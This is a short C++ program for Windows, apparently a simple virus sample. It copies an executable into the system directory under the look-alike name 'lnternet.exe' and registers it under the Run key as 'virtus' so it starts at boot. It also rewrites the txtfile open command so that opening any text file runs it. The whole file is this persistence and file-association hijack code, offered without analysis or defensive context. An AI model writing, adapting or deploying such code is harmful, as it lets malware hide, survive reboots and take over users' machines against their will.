#include <TCHAR.h>
#include <afx.h>

int main()
{
	TCHAR TempPath[MAX_PATH];
	CString temp;

	GetSystemDirectory(TempPath, MAX_PATH);
	temp = TempPath;
	temp = temp + _T("\\lnternet.exe");
	int len = temp.GetLength();

	LPBYTE lbp = new BYTE[len + 1];
	for (int j = 0; j < len; j++) {
		lbp[j] = temp[j];
	}
	lbp[j] = 0;

	if (!CopyFile("C:\\Project\\VC\\自动运行\\Debug\\自动运行.exe", temp, FALSE)) 
	{
		LPVOID lpMsgBuf;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpMsgBuf,
			0,
			NULL);
		MessageBox(NULL, (LPCTSTR)lpMsgBuf, "Error", MB_OK);
		LocalFree(lpMsgBuf);
	}

	HKEY hKey;
	LPCTSTR data_set = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, data_set, 0, KEY_WRITE, &hKey);
	RegSetValueEx(hKey, _T("virtus"), NULL, REG_SZ, lbp, len);
	RegCloseKey(hKey);

	data_set = "txtfile\\shell\\open\\command";
	RegOpenKeyEx(HKEY_CLASSES_ROOT, data_set, 0, KEY_WRITE, &hKey);
	RegSetValueEx(hKey, NULL, NULL, REG_EXPAND_SZ, lbp, len);
	RegCloseKey(hKey);

	delete [] lbp;
	return 0;
}
